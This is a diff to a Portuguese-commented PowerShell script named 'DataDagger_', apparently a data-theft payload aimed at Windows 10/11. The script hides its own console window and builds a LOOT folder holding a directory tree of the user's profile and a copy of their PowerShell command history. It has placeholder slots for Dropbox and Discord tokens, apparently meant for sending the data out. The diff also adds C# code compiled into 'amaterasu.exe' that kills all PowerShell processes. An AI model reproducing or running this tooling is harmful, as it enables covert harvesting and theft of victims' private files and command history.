@@ -1,6 +1,49 @@
+# Criar o executável "amaterasu.exe" para destruir o script
+$killScriptCode = @'
+using System;
+using System.Diagnostics;
+
+public class Program {
+    public static void Main() {
+        // Obtém todos os processos em execução com o nome "powershell" e encerra-os
+        Process[] processes = Process.GetProcessesByName("powershell");
+        foreach (Process proc in processes) {
+            proc.Kill();
+        }
+    }
+}
+'@
+
+# Salvar o código acima em um arquivo C# temporário
+$sourceFile = "$env:TEMP\KillPowerShell.cs"
+$killScriptCode | Out-File -FilePath $sourceFile -Encoding utf8
+
+# Compilar o arquivo C# em um executável
+$outputExe = "$env:TEMP\amaterasu.exe"
+$compilerOptions = @("/target:exe", "/out:$outputExe")
+$compilerParams = New-Object System.CodeDom.Compiler.CompilerParameters
+$compilerParams.GenerateExecutable = $true
+$compilerParams.GenerateInMemory = $false
+$compilerParams.TreatWarningsAsErrors = $false
+$compilerParams.ReferencedAssemblies.Add("System.dll")
+$compilerParams.ReferencedAssemblies.Add("System.Diagnostics.Process.dll")
+$compilerResults = Add-Type -TypeDefinition (Get-Content -Raw -Path $sourceFile) -Language CSharp -CompilerParameters $compilerParams -PassThru
+
+# Excluir o arquivo C# temporário
+Remove-Item -Path $sourceFile -Force
+
+# Verificar se o executável foi criado com sucesso
+if ($compilerResults.Errors.Count -eq 0) {
+    Write-Host "Executável 'amaterasu.exe' criado com sucesso."
+} else {
+    Write-Host "Erro ao criar o executável 'amaterasu.exe'."
+    foreach ($error in $compilerResults.Errors) {
+        Write-Host $error
+    }
+}
 ############################################################################################################################################################ 
 #                                                                                                                                                          #
-#   Nome       : DataDagger_                                                                                                                                #
+#   Nome       : DataDagger_                                                                                                                               #
 #   Autor      : Clank                                                                                                                                     #
 #   Categoria  : Recon                                                                                                                                     #
 #   Alvo       : Windows 10,11                                                                                                                             #
@@ -45,25 +88,8 @@ $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle,
 add-type -name win -member $i -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 
-# Função para desativar tudo ao inserir "amaterasu"
-function Desativar-Tudo {
-    param (
-        [string]$input
-    )
 
-    if ($input -eq "amaterasu") {
-        Write-Host "Desativando todas as atividades..."
-        # Parar todas as atividades aqui
-        # Por exemplo, você pode parar o agendamento, encerrar processos em execução, etc.
-        # Certifique-se de adicionar aqui todas as operações que deseja desativar quando a palavra-chave for inserida
-        Stop-Process -Name "powershell" -Force
-    } else {
-        Write-Host "Código de desativação incorreto."
-    }
-}
-
-# Adicione esta verificação ao final do script
-Desativar-Tudo -input $input
+# Faz uma Pasta chamada LOOT, um ficheiro em txt, e um ZIP 
 
 $FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
 
@@ -73,11 +99,15 @@ $ZIP = "$FolderName.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
+############################################################################################################################################################
+
 # Inserir os tokens pedidos abaixo "dropbox e/ou discord". 
 
 #$db = ""
 
 #$dc = ""
+
+############################################################################################################################################################
 
 # Reconhecimento de todos os diretórios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
@@ -85,12 +115,17 @@ tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 # Histórico da PowerShell
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
+############################################################################################################################################################
+
 function Get-fullName {
 
     try {
     $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
     }
+ 
+ # If no name is detected function will return $env:UserName 
 
+    # Write Error is just for troubleshooting 
     catch {Write-Error "No name was detected" 
     return $env:UserName
     -ErrorAction SilentlyContinue
@@ -101,8 +136,6 @@ function Get-fullName {
 }
 
 $fullName = Get-fullName
-
-# Continuação do script...
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
